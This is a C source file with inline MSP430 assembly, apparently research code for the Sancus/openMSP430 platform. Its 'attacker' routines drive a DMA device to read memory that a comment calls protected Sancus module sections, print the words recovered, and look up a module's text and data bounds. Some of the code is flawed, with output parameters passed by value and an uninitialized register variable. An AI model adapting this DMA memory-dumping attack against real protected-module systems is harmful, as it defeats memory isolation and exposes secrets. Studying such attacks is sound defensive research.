#include "attacker.h"

// DMA device's op-codes 
#define WRITE_OP       0x0001
#define END_WRITE      0x8000
#define READ_OP        0x0005
#define END_READ       0x8004
#define READ_OP_ACK    0x001D
#define WAIT_ACK_READ  0x200D
#define END_READ_ACK   0xA00C

	

//==============================================
// ASM instructions for controlling the device
//==============================================
uint16_t asm_config_dma_dev(uint16_t config_register, uint16_t num_of_words, uint16_t address, uint16_t op_code)
{
	asm(" ; Define memory addresses  \n\t"
		".equ START_ADDR_REG , 0x0100 \n\t"
		".equ N_WORDS_REG    , 0x0102 \n\t"
		".equ CONFIG_REG     , 0x0104 \n\t"	
		".equ DATA_REG       , 0x0106 \n\t"
		".equ OUT_REG        , 0x0108 \n\t"
		" ; Start reading operation   \n\t"
		" mov %1             , &START_ADDR_REG \n\t"
		" mov %2             , &N_WORDS_REG    \n\t" 
		" mov %3             , &CONFIG_REG     \n\t"
		" mov &CONFIG_REG    , %0     \n\t"
		: "=m"(config_register) //outputs
		: "m"(address), //inputs
		  "m"(num_of_words),
		  "m"(op_code) );
	return config_register;
}

uint16_t asm_dev_get_data ( uint16_t config_register, uint16_t* out, uint16_t op_code)
{	
	asm(" mov &DATA_REG   , %1 \n\t"
		" mov &CONFIG_REG , %0" 
		: "=m"(config_register), 
		  "=m"(*out) );
	if (config_register == WAIT_ACK_READ) // configure the device for another reading
	{
		asm(" mov %0 , &CONFIG_REG \n\t" 
			: /*no outputs*/
			: "m"(op_code) ); 
	}
	return config_register;		
}	


//==============================================
// C functions for higher level control
//==============================================
void attacker_read(uint16_t start_addr, uint16_t end_addr)
{
	uint16_t config_register;
	uint16_t num_of_words = (end_addr - start_addr +1) >> 1; //divided by two because the logic addresses, in use here, in openMSP are actually half the real addresses.
	int counter = 0; 
	uint16_t data_read;
	
	// Read from start_addr, most likely protected sections of SMs
	config_register = asm_config_dma_dev( config_register, num_of_words, start_addr, READ_OP_ACK);
	while (config_register != END_READ_ACK) 
	{
		//wait until the end of operation and save the data
		config_register = asm_dev_get_data( config_register, &data_read, READ_OP_ACK);
		counter=counter+1;	
		printf("[attacker] Data: 0x%.4x \n", data_read);
	}		
}


void get_struct_val(struct SancusModule* module_address, uint16_t ts, uint16_t te, uint16_t ds, uint16_t de)
{
	uint16_t config_register;
	uint16_t sm_struct_val[7];
	int counter = 0;
	uint16_t* tmp_var = 0;	

	config_register = asm_config_dma_dev(config_register, 7 , module_address, READ_OP_ACK);
	while (config_register != END_READ_ACK) 
	{
		//wait until the end of operation and save the data
		config_register = asm_dev_get_data(config_register, &sm_struct_val[counter], READ_OP_ACK);
		counter=counter+1;	
	}	

	
	// Assign output values
	char stringa[11];
	ts = sm_struct_val[3];  
	te = sm_struct_val[4];
	ds = sm_struct_val[5];
	de = sm_struct_val[6];
	/*for(counter=0; counter<7; counter++)
	{
		switch (counter)
		{
			case 0:
				stpcpy(stringa, "sm_id");
				break;
			case 1:
				stpcpy(stringa, "vendor_id");
				break;
			case 2:
				stpcpy(stringa ,"name");
				break;
			case 3:
				stpcpy(stringa, "text_start"); //sm_struct_val[3]
				break;
			case 4:
				stpcpy(stringa, "text_end");   //sm_struct_val[4]
				break;
			case 5:
				stpcpy(stringa, "data_start"); //sm_struct_val[5]
				break;
			case 6:
				stpcpy(stringa, "data_end");   //sm_struct_val[6]
				break;
		}
		printf("[attacker] %s \t: 0x%.4x \n",stringa,sm_struct_val[counter]);
	}  	*/	  
}











       
